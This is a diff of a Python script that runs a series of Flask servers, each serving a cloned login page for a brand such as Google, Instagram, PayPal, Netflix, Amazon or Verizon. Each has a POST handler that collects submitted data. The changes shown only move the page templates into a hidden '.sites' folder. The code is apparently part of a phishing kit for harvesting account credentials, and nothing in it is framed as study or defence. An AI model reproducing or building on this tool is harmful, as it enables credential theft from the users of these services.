@@ -96,7 +96,7 @@ while True:
 			google = Flask(__name__)
 			@google.route('/')
 			def google_index():
-				return render_template('sites/google/index.html')
+				return render_template('.sites/google/index.html')
 			@google.route('/', methods=['POST','GET'])
 			def get_google_data():
 				#part 1 of the process
@@ -202,7 +202,7 @@ while True:
 			instagram = Flask(__name__)
 			@instagram.route('/')
 			def instagram_index():
-				return render_template('sites/instagram/index.html')
+				return render_template('.sites/instagram/index.html')
 			@instagram.route('/', methods=['POST','GET'])
 			def get_instagram_data():
 				#part 1 of the process
@@ -309,7 +309,7 @@ while True:
 			snapchat = Flask(__name__)
 			@snapchat.route('/')
 			def snapchat_index():
-				return render_template('sites/snapchat/index.html')
+				return render_template('.sites/snapchat/index.html')
 			@snapchat.route('/', methods=['POST','GET'])
 			def get_snapchat_data():
 				#part 1 of the process
@@ -416,7 +416,7 @@ while True:
 			paypal = Flask(__name__)
 			@paypal.route('/')
 			def paypal_index():
-				return render_template('sites/paypal/index.html')
+				return render_template('.sites/paypal/index.html')
 			@paypal.route('/', methods=['POST','GET'])
 			def get_paypal_data():
 				#part 1 of the process
@@ -522,7 +522,7 @@ while True:
 			twitter = Flask(__name__)
 			@twitter.route('/')
 			def twitter_index():
-				return render_template('sites/twitter/index.html')
+				return render_template('.sites/twitter/index.html')
 			@twitter.route('/', methods=['POST','GET'])
 			def get_twitter_data():
 				#part 1 of the process
@@ -628,7 +628,7 @@ while True:
 			wifi = Flask(__name__)
 			@wifi.route('/')
 			def wifi_index():
-				return render_template('sites/wifi/index.html')
+				return render_template('.sites/wifi/index.html')
 			@wifi.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -734,7 +734,7 @@ while True:
 			shopping = Flask(__name__)
 			@shopping.route('/')
 			def shopping_index():
-				return render_template('sites/wordpress/test.html')
+				return render_template('.sites/wordpress/test.html')
 			@shopping.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -840,7 +840,7 @@ while True:
 			spotify = Flask(__name__)
 			@spotify.route('/')
 			def spotify_index():
-				return render_template('sites/spotify/tes.html')
+				return render_template('.sites/spotify/tes.html')
 				
 			@spotify.route('/', methods=['POST','GET'])
 			def get__data():
@@ -948,7 +948,7 @@ while True:
 			@netflix.route('/')
 			def netflix_index():
 				#return render_template('sites/netflix/tes.html')
-				return render_template('sites/netflix/m.html')
+				return render_template('.sites/netflix/m.html')
 			@netflix.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -1054,7 +1054,7 @@ while True:
 			steam = Flask(__name__)
 			@steam.route('/')
 			def steam_index():
-				return render_template('sites/VK/VK.html')
+				return render_template('.sites/VK/VK.html')
 			@steam.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -1161,7 +1161,7 @@ while True:
 			@yahoo.route('/')
 			def yahoo_index():
 				#return render_template('sites/test.html')
-				return render_template('sites/twitch.html')
+				return render_template('.sites/twitch.html')
 			@yahoo.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -1267,7 +1267,7 @@ while True:
 			amazon = Flask(__name__)
 			@amazon.route('/')
 			def amazon_index():
-				return render_template('sites/amazon.html')
+				return render_template('.sites/amazon.html')
 			@amazon.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
@@ -1373,7 +1373,7 @@ while True:
 			verizon = Flask(__name__)
 			@verizon.route('/')
 			def verizon_index():
-				return render_template('sites/verizon.html')
+				return render_template('.sites/verizon.html')
 			@verizon.route('/', methods=['POST','GET'])
 			def get__data():
 				#part 1 of the process
